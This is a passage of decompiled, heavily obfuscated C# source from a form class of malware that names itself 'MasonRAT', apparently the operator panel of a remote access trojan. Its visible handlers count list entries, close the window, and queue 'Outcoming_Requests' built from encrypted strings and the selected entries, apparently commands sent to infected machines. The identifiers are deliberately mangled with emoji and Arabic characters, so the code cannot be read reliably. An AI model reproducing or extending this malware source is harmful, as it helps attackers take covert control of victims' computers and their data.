      this.\u2694️MasonRAT\u270C\u060A\u060D\u0609ٻ\u060B\u0020\u0609ٸ\u0608\u060D\u060B.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2759) + Conversions.ToString(this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Items.Count) + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2760);
      this.\u2694️MasonRAT\u270Cﯧۛ̍اڜ\u0020\u060D\u060Aڠ\u060Aڣةـﻻ\u060Aﻻ\u0608ــ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2761) + this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.SelectedItems.Count.ToString() + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2762);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـۙ\u0609ـــ\u0608ڠڙـ؁ـ\u0609\u060A(object sender, EventArgs e)
  {
    try
    {
      if (this.\u2694️MasonRAT\u270C\u0608؁ڣـ\u060D\u060Aــﻋ؁\u060Eط̨ټژـۭ̍\u060D\u060A.\u2694️MasonRAT\u270C\u060A\u060A\u060Bﯧڙﻻ\u0608ؤ\u0608\u060A)
        return;
      this.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـ̍ح\u0609̍ـ\u060A\u0609\u060A\u060D\u060Dؤ\u0020\u060C(
    object sender,
    EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270C\u0608؁ڣـ\u060D\u060Aــﻋ؁\u060Eط̨ټژـۭ̍\u060D\u060A, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2763) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + selectedItem.SubItems[1].Text));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608ـحـ\u060Aڦ\u060Dــ\u060A\u060Aـب\u060Aڞـاـڙ\u0020(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cټ\u060E̍ٸ\u060Dـڙـدبڝـ\u060Dـٺ(object sender, PaintEventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cڇ\u0020\u0608\u060A\u0608\u060Cڞـ\u060Aــ(
    object sender,
    EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270C\u0608؁ڣـ\u060D\u060Aــﻋ؁\u060Eط̨ټژـۭ̍\u060D\u060A, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2764) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + selectedItem.SubItems[1].Text));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cۡدڼـڙڜڙـٺـ\u0609ۙ\u060Dـ\u060B\u060A\u0608(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cــڕڙﻻؤ\u060Aد\u0609ۜ\u0608ٽ\u060Aــ\u0608\u060Dـڙ̍();
  }

  private void \u2694️MasonRAT\u270Cـح\u060B\u060Dڣۭ\u060Eـڣڙح(object sender, CancelEventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060A̍ٺــ\u060B\u0609ۙـ̨\u060Fــۙۙـ\u060Aـ\u060C\u0608(
    object sender,
    CancelEventArgs e)
  {
  }
}
